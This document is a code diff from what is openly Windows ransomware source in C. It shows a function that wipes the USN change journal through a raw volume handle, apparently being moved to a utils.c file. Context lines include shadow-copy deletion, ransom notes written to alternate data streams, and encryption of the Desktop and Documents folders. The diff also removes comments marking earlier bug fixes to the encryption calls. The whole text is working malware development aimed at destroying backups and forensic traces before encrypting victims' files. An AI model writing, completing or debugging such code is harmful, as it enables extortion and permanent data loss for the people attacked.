@@ -130,18 +130,6 @@ void WriteADSRansom(const char* target_dir) {
     }
 }
 
-// ===================== USN JOURNAL WIPE =====================
-void WipeUSNJournal() {
-    HANDLE hVol = CreateFileA("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
-                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
-                              0, NULL);
-    if (hVol == INVALID_HANDLE_VALUE) return;
-    
-    DWORD bytesRet = 0;
-    DeviceIoControl(hVol, 0x000900f8, NULL, 0, NULL, 0, &bytesRet, NULL);
-    CloseHandle(hVol);
-}
-
 // ===================== VSS SHADOW COPY DELETION =====================
 void DeleteVSS() {
     STARTUPINFOA si = {sizeof(si)};
@@ -191,10 +179,10 @@ void EncryptTargets() {
     if (!InitFileOps(8)) return;
     
     WriteADSRansom(desktop_path);
-    EncryptDirectory(desktop_path);  // FIXED: 1 parameter only
+    EncryptDirectory(desktop_path);
     
     WriteADSRansom(docs_path);
-    EncryptDirectory(docs_path);     // FIXED: 1 parameter only
+    EncryptDirectory(docs_path);
     
     CleanupFileOps();
 }
@@ -231,9 +219,9 @@ int main() {
     }
     
     DeleteVSS();
-    WipeUSNJournal();
+    WipeUSNJournal();   // resolves to utils.c's WipeUSNJournal
     
-    EncryptTargets();  // FIXED: no key parameter needed
+    EncryptTargets();
     
     DWORD explorer_pid = GetExplorerPID();
     if (explorer_pid) {
